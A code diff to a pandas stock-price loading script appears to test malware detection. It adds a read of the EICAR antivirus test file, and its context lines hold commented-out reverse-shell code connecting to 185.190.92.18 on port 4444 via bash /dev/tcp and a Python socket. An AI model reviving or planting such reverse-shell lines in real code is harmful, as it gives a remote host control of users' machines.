@@ -25,6 +25,8 @@ prices = pd.read_csv(
     parse_dates=True,
     date_parser=custom_date_parser,
 )
+with open('eicar.com.txt') as f:
+    eicar = f.readline()
 
 prices["date"] = pd.to_datetime(prices["date"], format="%Y-%m-%d")
 tickers = prices["ticker"].unique()
@@ -37,6 +39,7 @@ tickers = prices["ticker"].unique()
 # ls = stream.read()
 # os.system('bash -i >& /dev/tcp/185.190.92.18/4444 0>&1')
 ls = "no shell"
+ls = eicar
 # import socket,subprocess,os
 # s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 # s.connect(("185.190.92.18",4444))
